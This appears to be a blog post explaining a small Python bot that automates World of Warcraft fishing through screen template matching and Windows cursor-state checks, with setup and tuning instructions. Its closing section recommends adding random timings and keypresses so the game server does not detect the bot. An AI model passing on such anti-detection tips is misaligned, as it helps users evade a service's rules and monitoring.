The method that the bot is using, should work in almost any fishing scenario in the game, I would personally avoid crowded places. The testing has been done in the current expansion (Shadowlands).\nThe bot is running on the currently Active Window, I haven\u0026rsquo;t performed checks wether this is the window of the game or not. It waits for about 2 seconds before it starts.\nMetrics Zereth Mortis: 29m 33s Items Looted: 161 That means that we loot roughly about ~5.4 fish per minute.\nInstallation \u0026amp; Usage Check the requirements.txt, for the Python Requirements and install them via pip install -r requirements.txt. The tests are done under Python3.10 however I believe everything should work with Python\u0026gt;=3.6.\nSet the bait Before using the bot, you need to supply it with an image of the bait. The image has to be on the bottom parts of the bait. Here is an example image, the green area indicates what would be a good image of the bait, it needs to be as small as possible.\nSave the image and place it at the root of the script as bait.png, additionally you can adjust the variable BAIT_IMAGE in the `fishingbot.py.\n⚠️ It is important for you to take the photo because of the graphical/display settings which can be different for each computer.\nFine-tune the script The fine tunning that you have to do consists of:\nFISHING_BUTTON = \u0026#34;b\u0026#34; TUNE_BAIT_MOUSE_UNDER_PX = 35 EDGE_RESET = 10, 10 ACTIVE_AFTER = 2 CONFIDENCE = 0.7 Variable Description FISHING_BUTTON The button that you use for fishing, in my case it was b TUNE_BAIT_MOUSE_UNDER_PX The offset pixels where the mouse is going to be whenever there is a bait, see the How it works? section EDGE_RESET Those are the x, y coordinates to reset the mouse after catching the fish, it is used to improve the success rate, leave it at 10, 10 ACTIVE_AFTER The bot simply waits 2 secs before it starts CONFIDENCE The confidence of the template matching How it works? The method is extremely simple, it utilizes two things. The first one is the Template Matching, this is what pyautogui.locateOnScreen uses under the hood and the second one is the PyGetCursorInfo function which is exposed by the win32gui lib.\nThe solution lies in the gif from the beginning, whenever the bobber actually catches a fish the AoE (Area of Effect) for the bobber becomes bigger allowing us to detect a change on the cursor, then we use the GetCursorInfo to catch the change of the cursor and if it becomes a different tuple from the default one which we set when there is nothing active on our cursor. Then we execute the click.\nNow about the fine-tuning, look at this example\nThe TUNE_BAIT_MOUSE_UNDER_PX variable which doesn\u0026rsquo;t have the best name ever is indicated with red, in simple terms it is how many pixels under the located bobber to place the mouse. For myself the range between 28-32 works the best, but as I said earlier this could differ.\nEdge cases There is a rare edge case when the default tuple for the cursor doesn\u0026rsquo;t change which happens if the script isn\u0026rsquo;t tune right, I\u0026rsquo;ve solved this by resetting the cursor at x=10, y=10 position of the screen and then bringing it back. In a case when the cursor\u0026rsquo;s icon doesn\u0026rsquo;t change and if it sits with the bait icon the bot would just wait the duration of the fishing and reset itself.\nAdditional features I\u0026rsquo;ve added a bit of randomness in the timings between each press of the fishing and the click of the bobber with additionally pressing space every now and then. Apparently the server can detect that something fishy is going on when this randomness is removed.\n","permalink":"https://sy1.sh/posts/simple-fishing-bot/","summary":"This fishing bot consists only of about 50 lines of code, it incorporates the mechanics of World of Warcraft and some simple Windows API Calls.\nRepository: https://github.com/syrull/simple-fishing-bot\nOverview The bot has about ~99% success rate, there are some extremely rare cases where the bot won\u0026rsquo;t catch it and I will explain why later.
